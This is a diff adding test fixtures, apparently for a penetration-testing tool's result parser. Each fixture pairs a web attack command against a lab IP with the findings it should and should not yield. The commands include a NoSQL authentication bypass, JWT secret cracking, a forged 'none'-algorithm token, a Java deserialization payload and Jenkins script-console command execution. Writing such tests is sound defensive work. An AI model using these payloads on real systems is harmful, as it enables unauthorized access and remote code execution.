@@ -772,6 +772,96 @@
         "web.lfi_confirmed",
         "loot.files"
       ]
+    },
+    {
+      "id": "web_nosqli_operator_auth_bypass",
+      "tool": "curl",
+      "action_id": "nosql-injection",
+      "command": "curl -si 'http://10.10.10.10/api/session/login' -H 'Content-Type: application/json' --data '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}'",
+      "stdout": "outputs/web_nosqli_auth_bypass.txt",
+      "expected_supported_kinds": ["web.nosqli_confirmed"],
+      "expected_facts": [
+        {"kind": "web.nosqli_confirmed", "value_contains": {"vector": "authentication_bypass"}}
+      ],
+      "forbidden_supported_kinds": [
+        "access.admin",
+        "credential.plaintext",
+        "credential.available",
+        "foothold.linux",
+        "foothold.windows",
+        "access.shell"
+      ]
+    },
+    {
+      "id": "web_jwt_signing_secret_cracked",
+      "tool": "jwt_tool",
+      "action_id": "jwt-attacks",
+      "command": "jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.J7kR2q -C -d wordlist.txt",
+      "stdout": "outputs/web_jwt_secret_cracked.txt",
+      "expected_supported_kinds": ["web.jwt_secret", "credential.candidate"],
+      "expected_facts": [
+        {"kind": "web.jwt_secret", "value_contains": {"secret": "hunter2", "algorithm": "HMAC"}},
+        {"kind": "credential.candidate", "value_contains": {"kind": "jwt_signing_secret", "secret": "hunter2"}}
+      ],
+      "forbidden_supported_kinds": [
+        "access.admin",
+        "credential.plaintext",
+        "credential.available",
+        "web.authz_bypass"
+      ]
+    },
+    {
+      "id": "web_jwt_none_alg_forged_accepted",
+      "tool": "curl",
+      "action_id": "jwt-attacks",
+      "command": "curl -si 'http://10.10.10.10/v2/account' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.'",
+      "stdout": "outputs/web_jwt_none_alg_accepted.txt",
+      "expected_supported_kinds": ["web.authz_bypass"],
+      "expected_facts": [
+        {"kind": "web.authz_bypass", "value_contains": {"method": "jwt", "vector": "forged_token"}}
+      ],
+      "forbidden_supported_kinds": [
+        "access.admin",
+        "access.system",
+        "credential.plaintext",
+        "web.jwt_secret"
+      ]
+    },
+    {
+      "id": "web_deserialization_command_output",
+      "tool": "curl",
+      "action_id": "deserialization",
+      "command": "curl -si 'http://10.10.10.10/app/import' -H 'Content-Type: application/x-java-serialized-object' --data-binary @payload.bin",
+      "stdout": "outputs/web_deserialization_rce.txt",
+      "expected_supported_kinds": ["web.cmdi_confirmed"],
+      "expected_facts": [
+        {"kind": "web.cmdi_confirmed", "value_contains": {"method": "insecure_deserialization", "os": "linux"}}
+      ],
+      "forbidden_supported_kinds": [
+        "access.admin",
+        "access.system",
+        "access.shell",
+        "foothold.linux",
+        "foothold.windows"
+      ]
+    },
+    {
+      "id": "web_jenkins_script_console_rce",
+      "tool": "curl",
+      "action_id": "jenkins-access",
+      "command": "curl -si 'http://10.10.10.10:8080/scriptText' --data-urlencode 'script=println \"id\".execute().text'",
+      "stdout": "outputs/web_jenkins_script_console.txt",
+      "expected_supported_kinds": ["web.cmdi_confirmed"],
+      "expected_facts": [
+        {"kind": "web.cmdi_confirmed", "value_contains": {"method": "jenkins_script_console", "os": "linux"}}
+      ],
+      "forbidden_supported_kinds": [
+        "access.admin",
+        "access.system",
+        "access.shell",
+        "foothold.linux",
+        "foothold.windows"
+      ]
     }
   ]
 }
